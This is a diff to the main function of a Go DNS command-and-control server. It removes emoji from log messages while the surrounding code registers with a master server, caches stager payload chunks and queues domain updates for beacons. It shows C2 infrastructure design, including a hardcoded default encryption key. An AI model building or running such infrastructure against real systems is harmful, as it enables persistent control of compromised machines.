@@ -631,8 +631,8 @@ func main() {
 
 	// SECURITY: Warn if using default encryption key
 	if cfg.EncryptionKey == "MySecretC2Key123!@#DefaultChange" {
-		fmt.Println("⚠️  WARNING: Using default encryption key! Change this in production!")
-		fmt.Println("⚠️  Set encryption_key in config.json or via environment variable")
+		fmt.Println("WARNING: Using default encryption key! Change this in production!")
+		fmt.Println("Set encryption_key in config.json or via environment variable")
 	}
 
 	// Initialize C2Manager with database for persistence
@@ -699,7 +699,7 @@ func main() {
 	fmt.Println("Registering with Master Server...")
 	activeDomains, err := masterClient.RegisterWithMaster(cfg.Domain, cfg.BindAddr)
 	if err != nil {
-		fmt.Printf("⚠️  WARNING: Failed to register with Master Server: %v\n", err)
+		fmt.Printf("WARNING: Failed to register with Master Server: %v\n", err)
 		fmt.Println("Continuing with local configuration")
 	} else {
 		fmt.Printf("✓ Registered with Master - received %d active domains\n", len(activeDomains))
@@ -721,7 +721,7 @@ func main() {
 
 	_, _, err = masterClient.Checkin(stats)
 	if err != nil {
-		fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
+		fmt.Printf("WARNING: Initial checkin to Master Server failed: %v\n", err)
 		fmt.Println("Continuing in resilient mode (will retry in background)")
 	} else {
 		fmt.Println("✓ Connected to Master Server successfully")
@@ -739,23 +739,23 @@ func main() {
 	}, func(cacheTasks []StagerCacheTask) {
 		// Handle stager cache tasks pushed from Master
 		if len(cacheTasks) > 0 {
-			logf("[C2] 📥 Received %d stager cache task(s) from Master", len(cacheTasks))
+			logf("[C2] Received %d stager cache task(s) from Master", len(cacheTasks))
 		}
 
 		for _, task := range cacheTasks {
-			logf("[C2] 📦 Processing cache: %s (%d chunks, %d bytes total)",
+			logf("[C2] Processing cache: %s (%d chunks, %d bytes total)",
 				task.ClientBinaryID, task.TotalChunks, len(task.Chunks))
 
 			// Cache all chunks in local database
 			if c2Manager.db == nil {
-				logf("[C2] ⚠️  ERROR: Database is nil, cannot cache chunks!")
+				logf("[C2] ERROR: Database is nil, cannot cache chunks!")
 				continue
 			}
 
 			if err := c2Manager.db.CacheStagerChunks(task.ClientBinaryID, task.Chunks); err != nil {
-				logf("[C2] ❌ Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
+				logf("[C2] Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
 			} else {
-				logf("[C2] ✅ Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
+				logf("[C2] Successfully cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
 			}
 		}
 	}, func(domainUpdates []string) {
@@ -764,12 +764,12 @@ func main() {
 			return
 		}
 
-		logf("[C2] 🌐 Received domain update from Master: %v", domainUpdates)
+		logf("[C2] Received domain update from Master: %v", domainUpdates)
 
 		// Convert domain list to JSON
 		domainsJSON, err := json.Marshal(domainUpdates)
 		if err != nil {
-			logf("[C2] ❌ Failed to marshal domain list: %v", err)
+			logf("[C2] Failed to marshal domain list: %v", err)
 			return
 		}
 
@@ -784,12 +784,12 @@ func main() {
 			// AddDomainUpdateTask uses "D" prefix (D0001, D0002) instead of "T" to avoid conflicts
 			taskID := c2Manager.AddDomainUpdateTask(beacon.ID, taskCommand)
 			if taskID != "" {
-				logf("[C2] 📤 Queued domain update task %s for beacon %s", taskID, beacon.ID)
+				logf("[C2] Queued domain update task %s for beacon %s", taskID, beacon.ID)
 				activeCount++
 			}
 		}
 
-		logf("[C2] ✅ Queued domain updates for %d beacon(s)", activeCount)
+		logf("[C2] Queued domain updates for %d beacon(s)", activeCount)
 	})
 
 	// Start periodic task polling (every 10 seconds)
@@ -926,7 +926,7 @@ func main() {
 
 	// Wait for shutdown signal
 	<-shutdownChan
-	fmt.Println("\n🛑 Shutting down DNS C2 Server...")
+	fmt.Println("\nShutting down DNS C2 Server...")
 
 	// Cancel context to stop DNS server
 	cancel()
